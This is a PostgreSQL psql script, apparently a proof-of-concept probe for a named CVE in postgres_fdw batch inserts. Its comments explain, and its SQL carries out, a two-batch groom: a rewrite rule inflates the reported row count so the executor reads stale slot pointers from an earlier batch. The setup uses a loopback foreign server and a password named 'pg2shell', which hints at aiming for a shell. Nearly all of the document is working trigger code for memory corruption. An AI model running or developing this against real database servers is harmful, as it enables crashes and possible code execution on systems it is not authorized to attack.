-- Two-batch stale-pointer groom probe for CVE-2026-120149 (loopback only).
-- batch_size=10. A single INSERT of 12 local rows makes ExecInsert flush a
-- first, benign batch of 10 (rule expands x!=999 rows 1:1, so numInserted=10
-- and no overrun). ri_Slots[0..9] are then kept across batches; ExecClearTuple
-- clears slot contents but does not null the pointers.
-- The second batch carries rows 11 and x=999. The rule expands x=999 into 12
-- rows, so the FDW reports numInserted=13 > numSlots=2. ExecBatchInsert then
-- walks ri_Slots[2..9] -- stale but VALID pointers from batch 1 -- before
-- reaching the zero gap past index 9.
\set ON_ERROR_STOP off
CREATE EXTENSION IF NOT EXISTS postgres_fdw;
DROP FOREIGN TABLE IF EXISTS ftable;
DROP TABLE IF EXISTS batch_table, batch_rule_table;
CREATE TABLE batch_table (x int);
CREATE TABLE batch_rule_table (x int);
CREATE RULE batch_rule AS ON INSERT TO batch_table
  DO INSTEAD INSERT INTO batch_rule_table
  SELECT i FROM generate_series(1, CASE WHEN NEW.x = 999 THEN 12 ELSE 1 END) i;
CREATE SERVER IF NOT EXISTS loopback FOREIGN DATA WRAPPER postgres_fdw
  OPTIONS (host '127.0.0.1', port '5432', dbname 'postgres');
CREATE USER MAPPING IF NOT EXISTS FOR postgres SERVER loopback
  OPTIONS (user 'postgres', password 'pg2shell');
CREATE FOREIGN TABLE ftable (x int) SERVER loopback
  OPTIONS (table_name 'batch_table', batch_size '10');
\echo == TWO-BATCH PROBE: batch1 10 rows benign; batch2 2 rows reports 13 ==
INSERT INTO ftable SELECT CASE WHEN i = 12 THEN 999 ELSE i END FROM generate_series(1,12) i;
\echo == END TWO-BATCH PROBE ==
